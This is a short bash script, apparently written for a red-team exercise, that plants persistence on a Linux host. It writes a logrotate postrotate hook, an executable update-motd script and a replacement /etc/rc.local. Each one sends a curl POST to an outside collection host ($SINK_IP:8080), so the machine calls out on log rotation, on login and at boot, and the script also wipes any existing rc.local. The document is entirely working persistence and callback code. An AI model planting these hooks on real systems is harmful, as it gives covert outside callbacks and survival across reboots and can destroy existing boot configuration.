#!/bin/bash
. /opt/rt/work/target.env
cat > /etc/logrotate.d/rt-l4 <<'CONF'
/var/log/rt-l4.log { daily rotate 1
  postrotate
    curl -s -m 3 -d 'rt-l4 logrotate' http://$SINK_IP:8080/lr || true
  endscript
}
CONF
printf '#!/bin/sh\ncurl -s -m 3 -d "rt-l4 motd" "http://$SINK_IP:8080/motd" || true\n' > /etc/update-motd.d/99-rt-l4
chmod +x /etc/update-motd.d/99-rt-l4 2>/dev/null || true
printf '#!/bin/sh\ncurl -s -m 3 -d "rt-l4 rc" "http://$SINK_IP:8080/rc" || true\nexit 0\n' > /etc/rc.local
chmod +x /etc/rc.local 2>/dev/null || true
